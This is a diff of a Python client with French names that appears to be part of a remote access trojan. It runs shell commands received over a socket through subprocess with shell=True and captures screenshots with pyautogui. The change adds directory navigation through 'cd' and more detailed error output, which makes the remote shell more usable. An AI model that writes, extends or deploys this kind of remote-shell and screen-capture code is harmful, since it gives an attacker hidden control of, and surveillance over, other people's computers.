@@ -86,12 +86,19 @@ def executeur_de_requetes(instruction, lien_socket):
         return commande_shell_directe(instruction) 
 
 def commande_shell_directe(cmd_text):
-    """Exécute une commande système standard"""
+    """Exécute une commande système et gère la navigation"""
     try:
+        # Si la commande commence par 'cd '
+        if cmd_text.startswith("cd "):
+            nouveau_dossier = cmd_text.split(" ", 1)[1]
+            os.chdir(nouveau_dossier) # Change le dossier pour TOUT le script client
+            return f"Répertoire changé pour : {os.getcwd()}" #
+        
+        # Pour toutes les autres commandes
         processus = subprocess.run(cmd_text, shell=True, capture_output=True, text=True)
-        return processus.stdout + processus.stderr 
-    except Exception:
-        return "Erreur système"
+        return processus.stdout + processus.stderr #
+    except Exception as e:
+        return f"Erreur système : {str(e)}" #
 
 def generer_instante_ecran():
     """Effectue une capture d'écran via pyautogui"""
